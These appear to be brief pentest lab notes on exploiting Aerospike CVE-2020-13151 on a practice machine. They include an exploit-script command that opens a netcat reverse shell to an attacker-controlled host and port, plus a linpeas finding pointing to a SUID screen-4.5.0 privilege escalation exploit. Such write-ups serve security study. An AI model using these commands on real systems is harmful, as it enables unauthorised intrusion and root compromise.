http://192.168.217.143:81/

![[Pasted image 20250209215030.png]]

https://github.com/b4ny4n/CVE-2020-13151
https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html

used this script from searchsploit (but the above should also work)
- had to patch it:
	- increase timeout time (SERVER SO SLOW BAD OFFSEC)
	- disable version checking
`python3 49067.py --ahost 192.168.195.143 --netcatshell --lhost 192.168.45.201 --lport 80`

got reverse shell

from linpeas scan:
```
-rwsr-xr-x 1 root root 1.8M May 10  2021 /usr/bin/screen-4.5.0 (Unknown SUID binary!)
```

https://www.exploit-db.com/exploits/41154


